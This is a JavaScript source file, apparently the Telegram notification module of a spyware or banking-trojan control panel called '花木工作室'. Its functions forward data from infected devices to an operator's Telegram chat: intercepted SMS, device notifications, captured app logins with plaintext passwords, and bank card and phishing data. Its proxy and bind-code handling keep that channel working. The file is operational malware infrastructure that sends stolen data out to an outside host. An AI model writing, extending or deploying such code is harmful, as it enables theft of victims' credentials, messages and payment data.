/**
 * ============================================================================
 * 花木工作室 — Telegram 机器人通知服务
 * ============================================================================
 * 职责：
 *   1. 配置管理：kv 'tg_config'（bot_token / chat_id / api_proxy / 六个 notify_* 开关）
 *      —— 配置读写路由在 routes.js（/m/tg/config），本模块只提供发送能力。
 *   2. 绑定流程：bind-request 生成 6 位验证码 → bot 实际下发到 chat →
 *      bind-confirm 校验通过后写回 tg_config.chat_id（UsersPage 绑定入口）。
 *   3. 事件通知：设备上线 / 新短信 / 设备通知 / 凭证捕获 / 银行卡数据 /
 *      AI 高分提醒 —— 由 zhuque.js / eagle.js / routes.js 在入库点调用
 *      ctx.tg.notifyXxx()（全部 fire-and-forget，不影响主流程）。
 *
 * 网络说明：api_proxy 兼容两种用法——
 *   ① 带 http(s):// 前缀 → 视为真实 HTTP 代理（Clash/SS 等），fetch 走 undici ProxyAgent；
 *   ② 无协议 → 视为镜像/反代 base URL（如 tg-proxy.example.com），替换官方域名。
 *
 * 被引用：server.js require('./tgbot') → tgbot.init(ctx) 设置 ctx.tg。
 */
let ctx = null;
let ProxyAgent = null;
try { ProxyAgent = require('undici').ProxyAgent; } catch {}
let _pxAgent = null;           // 复用的 HTTP 代理 dispatcher
const BIND = new Map();        // chat_id -> {code, expire}（验证码 10 分钟有效）

function cfg() {
  try {
    const r = ctx.db.prepare("SELECT v FROM kv WHERE k='tg_config'").get();
    return r ? JSON.parse(r.v) : {};
  } catch { return {}; }
}
function saveCfg(c) {
  try { ctx.db.prepare("INSERT OR REPLACE INTO kv VALUES('tg_config',?)").run(JSON.stringify(c)); } catch {}
}

// ---------------- TG Bot API ----------------
function api(method, body, token, proxyOverride) {
  const c = cfg();
  const tok = token || c.bot_token;
  if (!tok) return Promise.resolve({ok: false, error: '未配置 Bot Token'});
  let base = 'https://api.telegram.org';
  const px = String(proxyOverride !== undefined ? proxyOverride : (c.api_proxy || '')).trim();
  let dispatcher;
  if (px) {
    if (/^https?:\/\//.test(px)) {
      // 带协议 → 视为真实 HTTP 代理（Clash/SS 等），走 undici ProxyAgent
      if (!ProxyAgent) return Promise.resolve({ok: false, error: '缺少 undici 依赖（服务器需 npm i undici）'});
      try {
        if (!_pxAgent) _pxAgent = new ProxyAgent(px);
        dispatcher = _pxAgent;
      } catch (e) {
        return Promise.resolve({ok: false, error: '代理初始化失败: ' + String(e).slice(0, 80)});
      }
    } else {
      base = 'https://' + px;   // 无协议 → 旧用法：镜像/反代 base URL
    }
  }
  const ac = new AbortController();
  const timer = setTimeout(() => ac.abort(), 15000);
  return fetch(`${base}/bot${tok}/${method}`, {
    method: 'POST', headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(body), signal: ac.signal,
    ...(dispatcher ? {dispatcher} : {})
  }).then(r => r.json().catch(() => ({ok: false, error: '响应解析失败'})))
    .finally(() => clearTimeout(timer))
    .catch(e => ({ok: false, error: '网络错误: ' + String(e).slice(0, 80) + (e.cause && e.cause.message ? ' ← ' + String(e.cause.message).slice(0, 60) : '')}));
}

async function send(text, chatId) {
  const c = cfg();
  const chat = chatId || c.chat_id;
  if (!c.bot_token) return {ok: false, error: '未配置 Bot Token（系统设置 → Telegram）'};
  if (!chat) return {ok: false, error: '未配置 Chat ID（请先绑定或在配置中填写）'};
  const r = await api('sendMessage', {chat_id: chat, text: String(text).slice(0, 4000), disable_web_page_preview: true});
  if (r && r.ok) return {ok: true};
  return {ok: false, error: (r && r.description) || (r && r.error) || '发送失败'};
}

// ---------------- 事件通知（带开关过滤） ----------------
function devInfo(devId) {
  try { return ctx.getDevice(devId) || {}; } catch { return {}; }
}
const nm = d => [d.brand, d.model].filter(Boolean).join(' ').trim() || d.eagle_client || d.id || '未知设备';

function notifyIf(switchKey, text) {
  const c = cfg();
  if (!c.bot_token || !c.chat_id) return;       // 未配置直接跳过
  if (c[switchKey] === false) return;           // 默认开，显式 false 才关
  send(text).catch(() => {});
}

function notifyOnline(devId) {
  const d = devInfo(devId);
  notifyIf('notify_online',
    `🟢 设备上线\n${nm(d)} (${devId})\n电量 ${d.battery_pct || '?'}% · ${d.network_type || '未知网络'} · ${d.ip || ''}`);
}
function notifySms(devId, it, cnt) {
  const d = devInfo(devId);
  const sender = String((it && (it.sender || it.address || it.from || it.number)) || '未知号码');
  const body = String((it && (it.body || it.message || it.text || it.content)) || '');
  notifyIf('notify_sms',
    `📩 新短信 · ${nm(d)}${cnt > 1 ? `（等 ${cnt} 条）` : ''}\n发件人: ${sender}\n\n${body.slice(0, 500)}`);
}
function notifyNotification(devId, title, body) {
  const d = devInfo(devId);
  notifyIf('notify_notification', `🔔 设备通知 · ${nm(d)}\n${String(title || '').slice(0, 100)}\n${String(body || '').slice(0, 300)}`);
}
function notifyCredential(devId, it, total) {
  const d = devInfo(devId);
  const app = String((it && (it.app_name || it.app || it.app_pkg || it.pkg)) || '未知应用');
  const login = String((it && (it.login || it.account || it.user || it.username)) || '');
  const pwd = String((it && (it.password || it.pwd || it.data || it.value)) || '');
  notifyIf('notify_credential',
    `🔑 捕获凭证 · ${nm(d)}${total > 1 ? `（等 ${total} 条）` : ''}\n应用: ${app}\n账号: ${login.slice(0, 120)}\n密码: ${pwd.slice(0, 120)}`);
}
function notifyPhish(devId, data) {
  const d = devInfo(devId);
  notifyIf('notify_phish', `💳 银行卡/钓鱼数据 · ${nm(d)}\n${String(data).slice(0, 600)}`);
}
function notifyAi(devId, score, health) {
  const d = devInfo(devId);
  notifyIf('notify_ai_high_score', `🤖 AI 分析提醒 · ${nm(d)}\n评分 ${score}（${health || ''}）— 建议重点关注`);
}

// ---------------- 测试 / 绑定流程 ----------------
async function validateToken(token, proxy) {
  const r = await api('getMe', {}, token, proxy);
  if (r && r.ok) return {ok: true, username: r.result && r.result.username};
  return {ok: false, error: (r && (r.description || r.error)) || '校验失败'};
}

async function test() {
  const r = await send('🌸 花木工作室测试消息\nTelegram 通知通道已连通 ✓');
  return r.ok ? {ok: true, message: '测试消息已发送'} : {ok: false, error: r.error};
}

async function bindRequest(chatId) {
  const chat = Number(chatId);
  if (!chat || chat < 1) return {ok: false, error: 'Chat ID 无效（应为数字，如 123456789）'};
  const code = String(100000 + Math.floor(Math.random() * 900000));
  const r = await send(`🌸 花木工作室绑定验证码\n\n${code}\n\n10 分钟内有效，请在面板中输入以完成绑定。`, chat);
  if (!r.ok) return {ok: false, error: '发送失败: ' + r.error};
  BIND.set(chat, {code, expire: Date.now() + 10 * 60e3});
  return {ok: true};
}

async function bindConfirm(code) {
  const c = String(code || '').trim();
  if (!c) return {ok: false, error: '请输入验证码'};
  const now = Date.now();
  for (const [chat, v] of BIND) {
    if (v.expire < now) { BIND.delete(chat); continue; }
    if (v.code === c) {
      BIND.delete(chat);
      const conf = cfg();
      conf.chat_id = chat;
      saveCfg(conf);
      send(`✅ 绑定成功！花木工作室将通过此会话推送通知。`, chat).catch(() => {});
      return {ok: true, chat_id: chat};
    }
  }
  return {ok: false, error: '验证码错误或已过期'};
}

function unbind() {
  const conf = cfg();
  conf.chat_id = 0;
  saveCfg(conf);
  return {ok: true};
}
function status() {
  const c = cfg();
  return {bound: !!(c.bot_token && c.chat_id), has_token: !!c.bot_token};
}

function init(c) {
  ctx = c;
  ctx.tg = {send, test, validateToken, bindRequest, bindConfirm, unbind, status,
    notifyOnline, notifySms, notifyNotification, notifyCredential, notifyPhish, notifyAi};
}

module.exports = {init};
